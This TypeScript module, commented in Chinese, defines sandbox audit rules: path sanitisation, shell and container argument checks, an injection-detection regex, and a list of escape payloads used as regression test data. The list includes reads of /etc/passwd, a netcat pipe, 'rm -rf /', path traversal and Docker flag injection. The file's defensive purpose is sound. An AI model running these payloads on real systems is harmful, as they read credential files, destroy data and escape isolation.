// P2-07 沙箱安全审计规则与恶意行为特征。
// 本模块只做“判定/分类”，不执行任何不可信代码；供审计日志、监控与回归测试使用。
// 沙箱本身的隔离不依赖这里的启发式：容器创建参数（--network=none --read-only ...）才是权威边界。

export interface SanitizationAudit {
  /** 是否通过了所有路径/命令净化检查。 */
  ok: boolean;
  /** 失败原因（机器可读，稳定）。 */
  reasons: string[];
}

const MAX_PATH_SEGMENT_LENGTH = 255;
const MAX_TOTAL_PATH_LENGTH = 2048;

/** 净化返回：null 表示安全；否则返回失败原因。 */
export function auditFilePath(relativePath: string): string | null {
  const normalized = relativePath.replace(/\\/g, "/");
  if (!normalized || normalized.length === 0) return "empty";
  if (normalized.length > MAX_TOTAL_PATH_LENGTH) return "too-long";
  if (normalized.startsWith("/") || /^[A-Za-z]:/.test(normalized)) return "absolute";
  if (normalized.startsWith("./")) return "dot-prefix";
  if (/\0/.test(normalized)) return "nul";
  const segments = normalized.split("/");
  if (segments.some((segment) => segment === "..")) return "traversal";
  if (segments.some((segment) => segment.length > MAX_PATH_SEGMENT_LENGTH)) return "segment-too-long";
  return null;
}

/** 批量审计：全部通过才 ok。 */
export function auditPaths(relativePaths: string[]): SanitizationAudit {
  const reasons: string[] = [];
  for (const item of relativePaths) {
    const reason = auditFilePath(item);
    if (reason) reasons.push(`${reason}:${item}`);
  }
  return { ok: reasons.length === 0, reasons };
}

export const SHELL_UNSAFE_PATTERN = /[\x00\n\r;&|`$(){}\[\]<>*?~!\\]/;

/** 容器参数审计：拒绝可用于改变 docker 选项的 `--xxx` 形态（防参数注入）。 */
export function auditContainerArg(value: string): string | null {
  if (auditShellArg(value)) return auditShellArg(value);
  if (value.startsWith("--") || value.startsWith("-")) return "flag-like";
  return null;
}

/** shell 参数审计：单行、不含 shell 元字符（配合 argv 不经 shell 的机制双保险）。 */
export function auditShellArg(value: string): string | null {
  if (typeof value !== "string" || value.length === 0) return "empty";
  if (value.length > 4096) return "too-long";
  if (/[\x00\n\r]/.test(value)) return "control";
  return null;
}

/**
 * 判定字符串是否包含“可疑命令注入/探针”特征。
 * 仅用于测试与监控，不作为主要防线。
 */
export function looksLikeCommandInjection(value: string): boolean {
  return SHELL_UNSAFE_PATTERN.test(value) || value.includes("../") || value.startsWith("/") || value.startsWith("--") || value.startsWith("-");
}

/** 沙箱逃逸/渗透测试 payload 集（回归测试与审计演示用；不会在本进程执行）。 */
export const ESCAPE_PAYLOADS: ReadonlyArray<{ name: string; payload: string }> = [
  { name: "shell-command-substitution", payload: "$(cat /etc/passwd)" },
  { name: "shell-backtick", payload: "`cat /etc/passwd`" },
  { name: "shell-pipe", payload: "id | nc 127.0.0.1 4444" },
  { name: "path-traversal", payload: "../../../etc/passwd" },
  { name: "absolute-path", payload: "/etc/passwd" },
  { name: "env-injection-newline", payload: "KEY=1\nPATH=/evil" },
  { name: "argv-semicolon", payload: "true; rm -rf /" },
  { name: "argv-nul", payload: "arg\0evil" },
  { name: "argv-dash-option", payload: "--network=host" },
  { name: "python-eval-smuggling", payload: "import os; os.system('id')" },
] as const;

/** 对 payload 执行通用审计（路径规则/引号规则），返回命中的检测原因。 */
export function auditEscapePayloads(): Array<{ name: string; reasons: string[] }> {
  const results: Array<{ name: string; reasons: string[] }> = [];
  for (const item of ESCAPE_PAYLOADS) {
    const reasons: string[] = [];
    const pathReason = auditFilePath(item.payload);
    if (pathReason) reasons.push(`path:${pathReason}`);
    const shellReason = auditShellArg(item.payload);
    if (shellReason) reasons.push(`shell:${shellReason}`);
    if (looksLikeCommandInjection(item.payload)) reasons.push("injection-pattern");
    if (auditContainerArg(item.payload)) reasons.push(`arg:${auditContainerArg(item.payload)}`);
    results.push({ name: item.name, reasons });
  }
  return results;
}
